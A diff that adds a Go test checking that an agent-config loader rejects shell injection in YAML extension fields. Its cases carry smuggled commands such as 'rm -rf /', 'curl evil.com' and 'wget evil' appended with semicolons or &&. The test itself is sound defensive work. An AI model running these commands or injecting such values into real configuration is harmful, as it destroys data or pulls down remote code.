@@ -556,6 +556,88 @@ agents:
 	}
 }
 
+func TestLoad_ExtensionsRejectShellInjection(t *testing.T) {
+	header := `
+project: myteam
+coordination:
+  backend: discord
+  server_id: "1"
+  channels: {general: "g"}
+agents:
+  lead:
+    name: "Lead"
+    model: "claude-sonnet-4-6"
+    extensions:
+`
+	cases := []struct {
+		name string
+		ext  string
+	}{
+		{"marketplace name with semicolon", `
+      marketplaces:
+        - name: "caveman; touch /tmp/injected"
+          source: github
+          repo: JuliusBrussee/caveman
+`},
+		{"marketplace name with space", `
+      marketplaces:
+        - name: "caveman mode"
+          source: github
+          repo: JuliusBrussee/caveman
+`},
+		{"marketplace repo with semicolon", `
+      marketplaces:
+        - name: caveman
+          source: github
+          repo: "JuliusBrussee/caveman; touch /tmp/x"
+`},
+		{"marketplace repo missing slash", `
+      marketplaces:
+        - name: caveman
+          source: github
+          repo: "notarepo"
+`},
+		{"marketplace commit non-hex", `
+      marketplaces:
+        - name: caveman
+          source: github
+          repo: JuliusBrussee/caveman
+          commit: "abc; rm -rf /"
+`},
+		{"skill name with backtick", `
+      skills:
+        - name: "skill` + "`" + `bad"
+          source: github
+          repo: anthropics/skills
+`},
+		{"skill repo with injection", `
+      skills:
+        - name: security
+          source: github
+          repo: "anthropics/skills && curl evil.com"
+`},
+		{"plugin name with semicolon", `
+      plugins:
+        - name: "bad;plugin"
+          marketplace: caveman
+`},
+		{"plugin marketplace with injection", `
+      plugins:
+        - name: caveman
+          marketplace: "caveman; wget evil"
+`},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			path := writeYAML(t, header+tc.ext)
+			_, err := Load(path)
+			if err == nil {
+				t.Fatalf("expected validation error for %q, got nil", tc.name)
+			}
+		})
+	}
+}
+
 func TestExpandVaultRefs(t *testing.T) {
 	secrets := map[string]string{
 		"DISCORD_TOKEN": "tok123",
